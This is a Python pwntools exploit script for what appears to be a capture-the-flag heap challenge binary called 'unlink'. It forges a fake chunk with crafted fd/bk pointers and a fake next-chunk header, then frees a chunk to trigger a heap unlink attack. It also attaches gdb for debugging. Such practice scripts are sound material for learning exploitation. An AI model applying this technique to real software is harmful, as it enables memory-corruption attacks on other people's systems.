#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './unlink'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('5.Exit\n', str(ch))

def add(size):
	menu(1)
	p.sendlineafter('add:', str(size))
	print "add a chunk success"

def edit(idx, content):
	menu(2)
	p.sendlineafter('index:', str(idx))
	p.sendlineafter('data:', content)

	print "edit %d chunk success" % idx

def free(idx):
	menu(3)
	p.sendlineafter('index:', str(idx))
	print "delete chunk %d success " % idx


def show(idx):
	menu(4)
	p.sendlineafter('index:', str(idx))

	

def exploit():


	heap_ptr = 0x08049D60
	fake_fd = heap_ptr - 0xc 
	fake_bk = heap_ptr - 0x8 

	add(0x90)			#0x98
	add(0x90)
	add(0x90)

	gdb.attach(p, 'b* 0x0804884A')
	dbg()

	payload = p32(0) + p32(0x90) + p32(fake_fd) + p32(fake_bk)
	payload = payload.ljust(0x90, '\x00')
	payload += p32(0x90) + p32(0x98)					#fake header
	edit(0, payload)
	free(1)						#unlink



	p.interactive()
	p.close()

if __name__ == '__main__':

	p = process('./unlink')
	exploit()
